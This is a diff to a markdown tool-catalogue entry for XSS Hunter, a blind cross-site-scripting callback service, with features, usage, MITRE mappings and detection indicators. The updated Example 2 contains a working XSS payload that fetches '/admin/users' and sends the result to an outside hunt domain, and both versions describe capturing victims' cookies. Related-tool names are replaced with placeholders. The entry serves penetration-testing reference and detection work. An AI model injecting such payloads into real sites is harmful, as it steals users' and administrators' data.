@@ -1,17 +1,15 @@
 ---
-id: tool-xsshunter
-url: 'https://xsshunter.com'
+url: 'https://xsshunter.com/'
 tags:
   - xss
-  - payload-detection
+  - monitoring
 type: tool
 verified: false
 platforms:
-  - Linux
-  - Windows
   - Web
 created_at: '2023-10-01T00:00:00Z'
-updated_at: '2025-12-14T03:15:41.657Z'
+updated_at: '2025-12-14T17:29:20.207Z'
+id: acfb5b65-5b10-4649-8ebf-01d7e72ecbfe
 validated: true
 submitted: true
 ---
@@ -21,75 +19,56 @@ submitted: true
 
 ## Overview
 
-xsshunter is a free, open-source tool for creating and managing XSS hunting campaigns. It generates trackable payloads and provides a dashboard to detect when and where XSS payloads execute, ideal for confirming stored or reflected XSS vulnerabilities in web applications.
+XSS Hunter is a web-based service for generating, deploying, and monitoring blind XSS payloads, primarily used in penetration testing to detect and capture cross-site scripting vulnerabilities by reporting execution details remotely.
 
 ## Description
 
-Designed for penetration testers and bug bounty hunters, xsshunter allows deployment of JavaScript payloads that callback to a central server upon execution. In offensive security, it's used to verify XSS exploits remotely without manual browser checks, capturing details like victim IP, user-agent, and cookies. It supports custom domains to evade basic filters and integrates with reporting platforms like HackerOne.
+Designed for offensive security, XSS Hunter allows users to create unique hunts with custom domains (e.g., monty.xss.ht) that load JavaScript beacons upon payload execution. It captures comprehensive data including victim IP, user-agent, cookies, HTTP headers, and screenshot/DOM dumps. Commonly used in bug bounty programs like HackerOne for blind XSS in stored or reflected contexts, it supports payload customization and integrates with reporting workflows.
 
 ## Features
 
-- Feature 1: Payload generation with unique IDs for tracking multiple campaigns
-- Feature 2: Real-time dashboard for execution logs and victim details
-- Feature 3: Customizable payloads (e.g., img onerror, script src) for different XSS types
+- Feature 1: Payload generation with unique script sources for tracking
+- Feature 2: Real-time dashboard for hit notifications and data capture
+- Feature 3: Exportable reports including geolocation, timestamps, and exfiltrated content
 
 ## Installation
 
 ### Requirements
 
-- Node.js (v14+)
-- Git
-- A domain/subdomain for hosting the hunter
+- Web browser for dashboard access
+- Account registration on the service
 
 ### Install Commands
 
+No installation required; it's a SaaS tool.
+
 ```bash
-# Clone the repository
-git clone https://github.com/mandatoryprogrammer/xsshunter.git
-cd xsshunter
-
-# Install dependencies
-npm install
-
-# Set up database (SQLite by default)
-node index.js
+# No CLI install; access via browser
 ```
 
 ## Basic Usage
 
 ```bash
-node index.js
+# Dashboard access via browser
+# Create hunt: Visit https://xsshunter.com/ and log in
 ```
 
 ### Common Options
 
 | Option | Description |
 |--------|-------------|
-| `-h, --help` | Show help message |
-| `-p, --port` | Specify port for the server (default 80) |
-| `-d, --domain` | Set custom domain for payloads |
+| Create Hunt | Generate new payload domain |
+| View Hits | Dashboard for execution reports |
 
 ## Examples
 
 ### Example 1: Basic Usage
 
-```bash
-node index.js -d myhunter.com
-```
-
-This starts the server and generates payloads like <script src="https://myhunter.com/123"></script>.
+Create a hunt on the dashboard, copy the script URL, and inject `<script src="https://your-hunt.xss.ht"></script>` into a vulnerable field.
 
 ### Example 2: Advanced Usage
 
-```bash
-node index.js -p 8080 --db-path ./data.db
-```
-
-Run on port 8080 with custom SQLite path; access dashboard at http://localhost:8080.
-
-## Expected Output
-
-Server logs executions: e.g., "Payload 123 executed from IP 192.168.1.1 with cookies: session=abc".
+Customize payload to include additional JS for DOM scraping, e.g., `"><script src=https://monty.xss.ht></script><script>fetch('/admin/users').then(r=>r.text()).then(d=>location='https://monty.xss.ht/?data='+encodeURIComponent(d))</script>` for data exfiltration.
 
 ## MITRE ATT&CK Mapping
 
@@ -98,28 +77,29 @@ This tool is commonly associated with:
 ### Techniques
 
 - [[JavaScript]]
+- [[Exfiltration Over Command and Control Channel]]
 
 ### Tactics
 
-- [[Execution]]
+- [[Collection]]
+- [[Exfiltration]]
 
 ## Detection
 
 Indicators and methods for detecting this tool's usage:
 
-- Unusual outbound requests to external domains from web apps
-- JavaScript errors referencing unknown src attributes
-- Network logs showing callbacks to xsshunter-like endpoints
+- Outbound HTTPS requests to *.xss.ht domains
+- Unexpected script loads from external monitoring services in web logs
 
 ## Related Procedures
 
 
 ## Related Tools
 
-- [[Burp Suite]]
-- [[BeEF]]
+- [[Related Tool 1]]
+- [[Related Tool 2]]
 
 ## References
 
 - Official documentation: https://xsshunter.com/docs
-- GitHub: https://github.com/mandatoryprogrammer/xsshunter
+- Related resources: HackerOne XSS reports
